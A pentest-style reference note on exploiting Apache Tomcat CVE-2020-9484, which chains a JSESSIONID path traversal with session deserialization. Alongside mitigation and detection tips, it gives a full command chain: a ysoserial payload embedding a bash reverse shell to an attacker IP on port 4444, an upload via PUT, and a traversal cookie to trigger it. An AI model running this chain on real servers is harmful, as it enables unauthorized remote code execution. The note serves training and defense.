---
topic: Tomcat — session deserialization CVE-2020-9484
tags: [linux, tomcat, deserialization, session, cve-2020-9484]
---

# Tomcat — session deserialization CVE-2020-9484

**English** | [🌐 Español](tomcat-session-deserialization.md)

## Concept

Tomcat with `PersistentManager` stores sessions on disk and loads them based on `JSESSIONID`. If the value allows path traversal and an attacker can upload a serialized file, Tomcat deserializes controlled data and runs Java gadgets. CVE-2020-9484 combines the traversal with deserialization.

## When it applies

- Tomcat uses `PersistentManager` with file storage.
- A file can be uploaded to a known path.
- The version predates the CVE-2020-9484 fix.

## Procedure

1. Confirm the version and session manager.
2. Generate a serialized session with `ysoserial`.
3. Upload it to an accessible path.
4. Send `JSESSIONID` with the traversal and verify execution.

## Commands

```bash
curl -s http://<HOST>:8080/ | grep -i tomcat
ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > session.ser
curl -X PUT --data-binary @session.ser http://<HOST>:8080/upload/session.ser
curl -H "Cookie: JSESSIONID=../../upload/session" http://<HOST>:8080/
```

## Variants

- Use another gadget available on the classpath.
- Abuse a log or upload directory.
- Chain it with a WAR deployment if the manager is reached.

## Limitations

- The manager must be configured and the path must exist.
- Patched versions validate the session ID.
- The gadget must be on the classpath.

## Mitigation

- Update Tomcat and do not persist sessions in writable paths.
- Validate `JSESSIONID` and use in-memory sessions.
- Restrict file upload and manager access.

## Detection

- `JSESSIONID` with `../` or absolute paths.
- New session files in upload directories.
- Deserialization and Tomcat child processes.

## References

- [NVD — CVE-2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484)
- [0xdf — Feline](https://0xdf.gitlab.io/2021/02/20/htb-feline.html)
- [Tomcat — PersistentManager](https://tomcat.apache.org/tomcat-9.0-doc/config/manager.html)
